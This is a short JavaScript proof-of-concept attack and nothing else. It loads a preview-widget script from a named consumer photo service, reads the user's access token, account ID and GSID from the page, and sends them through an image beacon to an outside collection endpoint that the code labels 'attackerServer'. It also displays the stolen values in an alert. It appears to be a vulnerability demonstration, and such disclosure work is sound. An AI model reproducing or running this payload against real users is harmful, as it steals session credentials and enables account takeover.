(() => {
  const scriptUrl = "https://www.snapfish.com/cart/static/previewwidget.js?context=/hp/sf/sf-us/snapfish-us";
  const attackerServer = "https://eo1ey5201bcmppg.m.pipedream.net";

  const exfiltrate = d => new Image().src = `${attackerServer}?t=${encodeURIComponent(d.access_token||'')}&id=${encodeURIComponent(d.account_id||'')}&g=${encodeURIComponent(d.gsid||'')}&cb=${Date.now()}`;
  const show = d => alert(`Access Token: ${d.access_token || 'n/a'}\n\nAccount ID: ${d.account_id || 'n/a'}\n\nGSID: ${d.gsid || 'n/a'}`);

  const s = document.createElement("script");
  s.src = scriptUrl;
  s.onload = () => {
    const info = window.userInfo || {};
    exfiltrate(info);
    show(info);
  };
  document.head.appendChild(s);
})();
